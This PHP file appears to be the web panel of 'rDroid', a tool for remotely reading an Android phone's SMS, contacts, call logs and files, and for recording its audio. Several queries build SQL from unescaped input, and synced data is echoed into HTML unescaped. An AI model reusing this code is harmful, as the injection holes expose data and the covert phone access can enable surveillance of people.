<?PHP

/*
* $arr = get_defined_functions(); 
* foreach ($arr['user'] as $key => $value){ 
* echo $value.'<br />'; 
* } 
*/
ini_set('include_path', '.:/home/madsac/public_html/');
//$key = array_search('green', $array);
include("include/db.php");
include("functions2.php");
$SOFTNAME = " - rDroid ";
$SmsType = array(
    '0' => 'Unknown',
    '1' => 'Inbox',
    '2' => 'Sent',
    '3' => 'Draft',
    '4' => 'Outbox',
    '5' => 'Failed');
$VolumeType = array(
    '0' => 'Voice Call',
    '1' => 'System',
    '2' => 'Ring',
    '3' => 'Notification',
    '4' => 'Music',
    '5' => 'Alarm');
$CallType = array(
    '1' => 'Incoming',
    '2' => 'Dialed',
    '3' => 'Missed');
$VolumeSource = array(
    '0' => 'Default',
    '1' => 'Mic',
    '2' => 'Uplink',
    '3' => 'Downlink',
    '4' => 'Call',
    '5' => 'Camcorder',
    '6' => 'Recognition',
    '7' => 'Communication');
//$key = array_search('green', $array);

function putEVar($name, $data)
{
    $ar = getEVar($name);
    if (isset($data['count'])) $ar['count'] += 1;
    if (isset($data['lactive'])) $ar['lactive'] = $data['lactive'];
    if (isset($data['lrecieved'])) $ar['lrecieved'] = $data['lrecieved'];
    if (isset($data['public'])) $ar['public'] = $data['public'];
    if (isset($data['clpbrd'])) $ar['clpbrd'] = $data['clpbrd'];
    if (isset($data['isnotrecording'])) $ar['isnotrecording'] = $data['isnotrecording'];
    if (isset($data['arsource'])) $ar['arsource'] = $data['arsource'];
    if (isset($data['cLoud'])) $ar['cLoud'] = $data['cLoud'];
    if (isset($data['cKill'])) $ar['cKill'] = $data['cKill'];
    if (isset($data['cVol'])) $ar['cVol'] = $data['cVol'];
    $dt = stre(json_encode($ar));
    $query = "UPDATE `rDROID_DeViCes` SET `evar`='$dt' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}


function printDevices($usr)
{
    $usr = stre($usr);
    $query = "SELECT * FROM `rDROID_DeViCes` WHERE `oWner`='$usr'";
    $result = mysql_query($query);
    if (!$result) {
        echo "Well,Your account has No active device.";
    } //!$result
    else {
        if (mysql_num_rows($result)) {
            echo "<table class=\"dark\"><thead><tr><th colspan=2>Device Name</th></tr></thead><tbody>";
        } //mysql_num_rows($result)
        while ($ar = mysql_fetch_assoc($result)) {
            $name = ($ar['nMe']);
            $a2 = getEvar($name);
            $num = $a2['count'];
            $ltime = $a2['lrecieved'];
            $lactive = $a2['lactive'];
            $public = $a2['public'];
            echo "<tr><td><h4>" . strtoupper($name) . "</h4>SMS : $num<br/>Last recieved : $ltime<br/>$pub<br/>Last Connection :$lactive |
            <a href='do.php?device=$name&main=device&sub=checkactive'>Check Active</a><br/><td>
            <a href='info.php?device=$name'>Info</a><br/>
            <a href='sms/?device=$name'>SMS</a><br/>
            <a href='contacts/?device=$name' >Contacts</a><br/> 
            <a href='filemanager/?device=$name'>File Manager</a> <br/>
            <a href='call/?device=$name'>Call Logs</a> <br/>
            <a href='call/dialer.php?device=$name'>Dialer</a> <br/>
            <a href='musicplayer/?device=$name'>Music Player</a> <br/>
            <a href='soundrecorder.php?device=$name'>Sound Recorder</a><br/>
            <a href='settings.php?device=$name'>Settings</a><br/>
            <a href='misc.php?device=$name'>Misc</a>
            </td></tr>";

        } //$ar = mysql_fetch_assoc($result)
        echo "</tbody></table>";
    }

}

function getFilesList($name)
{
    $query = "SELECT `fileManager` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = mysql_fetch_assoc($result);
    return urldecode($ar['fileManager']);
}

function printCallLogs($name)
{

    $query = "SELECT `callLogs` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = aryd(mysql_fetch_assoc($result));
    if (strlen($ar['callLogs']) > 4) {
        $ar = explode("|**DATA**|", urldecode($ar['callLogs']));
        $calls = array();
        for ($i = 1; $i < count($ar) - 1; $i++) {
            $dt = explode("|S|", $ar[$i]);
            $calls[$i] = array();
            //TW.Write(c.CachedName &	"|S|" & c.CallType &"|S|" & c.Duration &"|S|" & c.Number &"|S|" &DateTime.Date(c.Date) & " " & DateTime.Time(c.Date)  & "|**DATA**|")
            $calls[$i]['name'] = $dt[0];
            $calls[$i]['type'] = $dt[1];
            $calls[$i]['duration'] = $dt[2];
            $calls[$i]['number'] = $dt[3];
            $calls[$i]['date'] = $dt[4];
        }
        $i = 0;
        $CallType = array(
            '1' => 'Recieved',
            '2' => 'Dialed',
            '3' => 'Missed');
        foreach ($calls as $call) {
            if (strlen($call['name']) < 1)
                $call['name'] = "[Unknown]";
            $class = ($i % 2 == 0) ? "even" : "odd";
            $html = $html . '<tr class="' . $class . '" id="call"><td>' . $call['name'] . '</td><td>' . $CallType[trim($call['type'])] . '</td><td>' . $call['duration'] . ' Sec.</td><td class="num">' . $call['number'] . '</td><td>' . $call['date'] . '</td></tr>';
            $i++;
        }
        $html = "Last synced on : " . $ar[0] . "<a href='#' class='metro' id='sync'>Sync</a><br /><table class=\"general\"><tr class=\"head\"><th>Name</th><th>Type</th><th>Duration</th><th>Number</th><th>Date</th></tr>" . $html . "</table>";


        //echo '['.substr($html, 0, - 1).']';
        echo $html;
    } //strlen($ar['Contacts']) > 4
    else {
        echo "No call logs synced yet.";
    }

}

function printDeviceInfo($name)
{

    $query = "SELECT `info` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = aryd(mysql_fetch_assoc($result));
    if (strlen($ar['info']) > 4) {
        $ar = explode("|**DATA**|", urldecode($ar['info']));
        $infos = array();
        for ($i = 1; $i < count($ar) - 1; $i++) {
            $dt = explode("|S|", $ar[$i]);
            $infos[$i] = array();
            //TW.Write(c.CachedName &	"|S|" & c.CallType &"|S|" & c.Duration &"|S|" & c.Number &"|S|" &DateTime.Date(c.Date) & " " & DateTime.Time(c.Date)  & "|**DATA**|")
            $infos[$i]['name'] = $dt[0];
            $infos[$i]['value'] = $dt[1];
        }
        $i = 0;
        foreach ($infos as $info) {
            $class = ($i % 2 == 0) ? "even" : "odd";
            $html = $html . '<tr class="' . $class . '"><td>' . $info['name'] . '</td><td>' . $info['value'] . '</td></tr>';
            $i++;
        }
        $html = "Last synced on : " . $ar[0] . "<br /><table class=\"general\"><tr class=\"head\"><th>Name</th><th>Value</th></tr>" . $html . "</table>";


        //echo '['.substr($html, 0, - 1).']';
        echo $html;
    } //strlen($ar['Contacts']) > 4
    else {
        echo "Device information has not been synced yet.";
    }

}

function printContacts($name, $ajax = 0)
{
    $query = "SELECT `Contacts` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = aryd(mysql_fetch_assoc($result));
    if (strlen($ar['Contacts']) > 4) {
        $ar = explode("|C|", $ar['Contacts']);
        $ajx = "";
        $contacts = array();
        for ($i = 0; $i < count($ar); $i++) {
            $dt = explode("|N|", $ar[$i]);
            if ($dt[0] == "Date") {
                $lst = $dt[1];
                $i++;
            } //$dt[0] == "Date"
            else {
                $ph = explode("|P|", $dt[1]);
                $phs = array();
                for ($x = 0; $x < count($ph); $x++)
                    if (strlen($ph[$x]) > 2) $phs[] = $ph[$x];
                $ph = explode("|E|", $dt[2]);
                $ems = array();
                for ($x = 0; $x < count($ph); $x++)
                    if (strlen($ph[$x]) > 2) $ems[] = $ph[$x];
                sort($phs);
                sort($ems);
                $contacts[] = array(
                    'name' => $dt[0],
                    'phones' => $phs,
                    'emails' => $ems,
                    'id' => $dt[3],
                    'lastcontacted' => $dt[4],
                    'fullname' => $dt[5],
                    'note' => $dt[6],
                    'defaultnumber' => $dt[7],
                    'starred' => $dt[8],
                    'timescontacted' => $dt[9]);
            }
        } //$i = 0; $i < count($ar); $i++
        /*array_multisort(array_map(function ($user) {
            return $user['name']; }
        , $contacts), SORT_ASC, $contacts);*/
        $html = "";
        if ($ajax) {
            foreach ($contacts as $contact) {
                $name = $contact['name'];
                foreach ($contact['phones'] as $ph) {
                    if ($ajax < 2)
                        $html = $html . '<option>' . $name . ' [' . $ph . ']</option> ';
                    else if ($ajax == 2)
                        $html = $html . '"' . $name . ' <' . $ph . '>",';
                    else
                        $html = $html . "'" . $ph . "':'" . $name . "',";
                }
            } //$contacts as $contact
            $html = substr($html, 0, -1);
        } //$ajax
        else {
            $i = 1;
            foreach ($contacts as $contact) {
                if (strlen($name) > 0 && strlen($contact['id']) > 0) {

                    $phs = "";
                    $ems = "";
                    for ($x = 0; $x < count($contact['phones']); $x++) $phs = $phs . "<a class='phone'>" . $contact['phones'][$x] . '</a>,';
                    //if(strlen($phs)>3){
                    $class = ($i % 2 == 0) ? "even" : "odd";
                    foreach ($contact['emails'] as $em) $ems = $ems . "<a class='email'>" . $em . "</a>,";

                    $html = $html . '<tr class="' . $class . '" data-last="' . $contact['lastcontacted'] . '" data-fullname="' . $contact['fullname'] . '" data-note="' . $contact['note'] . '" data-default="' . $contact['defaultnumber'] . '" data-starred="' . $contact['starred'] . '" data-times="' . $contact['timescontacted'] . '"><td>' . $i . '</td><td>' . $contact['name'] . '</td><td>' . $phs . '</td><td>' . $ems . '</td><td><a href="#" id="edit">Edit</a>|<a href="#" id="view">View</a></td></tr>';
                    $i++;
                } //strlen($name) > 0 && strlen($contact['id']) > 0
            } //$contacts as $contact
            //}
            $html = "Last synced on : " . $lst . "<br><table class=\"general\"><tr class=\"head\"><th>Sr No.</th><th>Name</th><th>Phone Numbers</th><th>Email</th><th>Action</th></tr>" . $html . "</table>";
        }

        //echo '['.substr($html, 0, - 1).']';
        echo $html;
    } //strlen($ar['Contacts']) > 4
    else {
        if (!$ajax)
            echo "No contacts synced yet.";
        else
            echo '""';
    }
}

?>